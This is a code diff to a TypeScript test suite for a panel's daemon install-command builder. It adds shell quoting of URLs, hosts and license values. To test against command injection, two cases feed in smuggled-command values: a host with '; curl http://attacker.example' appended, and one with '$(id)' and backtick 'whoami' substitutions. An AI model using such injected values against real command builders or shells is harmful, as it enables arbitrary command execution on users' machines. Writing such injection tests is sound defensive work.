@@ -3,16 +3,29 @@ import {
   buildLicenseInstallCommand,
   CDN_RUN_SCRIPT_DISPLAY,
   encodeLicenseArg,
+  shellQuote,
 } from './daemon-install-command.ts'
 
 function extractLicenseArg(command: string): string {
-  const match = /TURBOPANEL_LICENSE=([^\s]+)/.exec(command)
-  if (!match) throw new Error('no TURBOPANEL_LICENSE in command')
+  const match = /TURBOPANEL_LICENSE='([^']*)'/.exec(command)
+  if (!match) throw new TypeError('no quoted TURBOPANEL_LICENSE in command')
   return match[1]
 }
 
+describe('shellQuote', () => {
+  it('wraps values in single quotes', () => {
+    expect(shellQuote('https://panel.example.com/run.sh')).toBe(
+      "'https://panel.example.com/run.sh'",
+    )
+  })
+
+  it('escapes embedded single quotes for POSIX shells', () => {
+    expect(shellQuote("a'b")).toBe(String.raw`'a'\''b'`)
+  })
+})
+
 describe('buildLicenseInstallCommand', () => {
-  it('uses run.sh on the instance host in dev', () => {
+  it('uses run.sh on the instance host in dev with insecure TLS', () => {
     const command = buildLicenseInstallCommand({
       runtime: 'deno',
       instanceUrl: 'https://huey.turbopanel.dev:8443',
@@ -24,11 +37,13 @@ describe('buildLicenseInstallCommand', () => {
     const encoded = encodeLicenseArg('license-id', 'token')
 
     expect(command).toContain(
-      'curl -fsSLk https://huey.turbopanel.dev:8443/run.sh',
+      `curl -fsSLk ${shellQuote('https://huey.turbopanel.dev:8443/run.sh')}`,
     )
     expect(command).not.toContain('/api/install/v1/daemon-install.sh')
-    expect(command).toContain(`| TURBOPANEL_LICENSE=${encoded}`)
-    expect(command).toContain('TURBOPANEL_HOST=https://huey.turbopanel.dev:8443')
+    expect(command).toContain(`| TURBOPANEL_LICENSE=${shellQuote(encoded)}`)
+    expect(command).toContain(
+      `TURBOPANEL_HOST=${shellQuote('https://huey.turbopanel.dev:8443')}`,
+    )
     expect(command).toContain('TURBOPANEL_INSECURE_TLS=1')
     expect(command).toMatch(/ sh$/)
     expect(command).not.toContain('sh -s --')
@@ -49,10 +64,77 @@ describe('buildLicenseInstallCommand', () => {
       insecureTls: true,
     })
 
-    expect(command).toContain('curl -fsSL http://huey.lan:8880/run.sh')
+    expect(command).toContain(
+      `curl -fsSL ${shellQuote('http://huey.lan:8880/run.sh')}`,
+    )
     expect(command).not.toContain('curl -fsSLk')
     expect(command).not.toContain('TURBOPANEL_INSECURE_TLS')
-    expect(command).toContain('TURBOPANEL_HOST=http://huey.lan:8880')
+    expect(command).toContain(
+      `TURBOPANEL_HOST=${shellQuote('http://huey.lan:8880')}`,
+    )
+  })
+
+  it('production HTTPS without insecureTls uses verified curl and no insecure env', () => {
+    const command = buildLicenseInstallCommand({
+      runtime: 'deno',
+      instanceUrl: 'https://panel.example.com',
+      licenseId: 'license-id',
+      licenseToken: 'token',
+    })
+
+    expect(command).toContain(
+      `curl -fsSL ${shellQuote('https://panel.example.com/run.sh')}`,
+    )
+    expect(command).not.toContain('curl -fsSLk')
+    expect(command).not.toContain('TURBOPANEL_INSECURE_TLS')
+    expect(command).toContain(
+      `TURBOPANEL_HOST=${shellQuote('https://panel.example.com')}`,
+    )
+  })
+
+  it('dev HTTPS with insecureTls produces curl -k and TURBOPANEL_INSECURE_TLS', () => {
+    const command = buildLicenseInstallCommand({
+      runtime: 'deno',
+      instanceUrl: 'https://huey.lan:8443',
+      licenseId: 'license-id',
+      licenseToken: 'token',
+      insecureTls: true,
+    })
+
+    expect(command).toContain(
+      `curl -fsSLk ${shellQuote('https://huey.lan:8443/run.sh')}`,
+    )
+    expect(command).toContain('TURBOPANEL_INSECURE_TLS=1')
+  })
+
+  it('quotes shell-sensitive characters in the curl URL and host env', () => {
+    const evilHost = 'https://panel.example.com; curl http://attacker.example'
+    const command = buildLicenseInstallCommand({
+      runtime: 'deno',
+      instanceUrl: evilHost,
+      licenseId: 'license-id',
+      licenseToken: 'token',
+    })
+
+    expect(command).toContain(`curl -fsSL ${shellQuote(`${evilHost}/run.sh`)}`)
+    expect(command).toContain(`TURBOPANEL_HOST=${shellQuote(evilHost)}`)
+    // Metacharacters must not appear outside the quoted regions as bare tokens.
+    expect(command).not.toMatch(/curl -fsSL https:[^']*;/)
+  })
+
+  it('quotes spaces, command substitution, paths, and query strings in values', () => {
+    const host =
+      'https://panel.example.com/path with spaces?x=$(id)&y=`whoami`'
+    const command = buildLicenseInstallCommand({
+      runtime: 'deno',
+      instanceUrl: host,
+      licenseId: 'id',
+      licenseToken: 'tok',
+    })
+
+    expect(command).toContain(shellQuote(`${host}/run.sh`))
+    expect(command).toContain(shellQuote(host))
+    expect(command).toContain(shellQuote(encodeLicenseArg('id', 'tok')))
   })
 
   it('uses run.sh on self-hosted Deno installs', () => {
@@ -65,11 +147,13 @@ describe('buildLicenseInstallCommand', () => {
     })
 
     expect(command).toContain(
-      'curl -fsSLk https://huey.lan:8443/run.sh',
+      `curl -fsSLk ${shellQuote('https://huey.lan:8443/run.sh')}`,
     )
     expect(command).not.toContain('/api/install/v1/daemon-install.sh')
     expect(command).not.toContain('raw.githubusercontent.com')
-    expect(command).toContain('TURBOPANEL_HOST=https://huey.lan:8443')
+    expect(command).toContain(
+      `TURBOPANEL_HOST=${shellQuote('https://huey.lan:8443')}`,
+    )
     expect(command).toContain('TURBOPANEL_INSECURE_TLS=1')
     expect(command).not.toContain('sh -s --')
     expect(command).not.toContain('--binary-url')
@@ -86,7 +170,7 @@ describe('buildLicenseInstallCommand', () => {
     const encoded = encodeLicenseArg('license-id', 'token')
 
     expect(command).toBe(
-      `curl -fsSL ${CDN_RUN_SCRIPT_DISPLAY} | TURBOPANEL_LICENSE=${encoded} sh`,
+      `curl -fsSL ${shellQuote(CDN_RUN_SCRIPT_DISPLAY)} | TURBOPANEL_LICENSE=${shellQuote(encoded)} sh`,
     )
     expect(command).not.toContain('https://trbp.nl')
     expect(command).not.toContain('TURBOPANEL_INSTALL_SCRIPT_URL')
@@ -106,8 +190,10 @@ describe('buildLicenseInstallCommand', () => {
       licenseToken: 'token',
     })
 
-    expect(command).toContain(`curl -fsSL ${CDN_RUN_SCRIPT_DISPLAY}`)
-    expect(command).toContain('TURBOPANEL_HOST=https://panel.example.com')
+    expect(command).toContain(`curl -fsSL ${shellQuote(CDN_RUN_SCRIPT_DISPLAY)}`)
+    expect(command).toContain(
+      `TURBOPANEL_HOST=${shellQuote('https://panel.example.com')}`,
+    )
   })
 
   it('does not require the operator to prefix sudo', () => {
@@ -121,7 +207,7 @@ describe('buildLicenseInstallCommand', () => {
     const encoded = encodeLicenseArg('abc', 'secret')
 
     expect(command).toMatch(/curl -fsSL .+ \| TURBOPANEL_LICENSE=/)
-    expect(command).toContain(`TURBOPANEL_LICENSE=${encoded}`)
+    expect(command).toContain(`TURBOPANEL_LICENSE=${shellQuote(encoded)}`)
     expect(command).not.toContain('--binary-url')
     expect(command).not.toContain('sudo')
   })
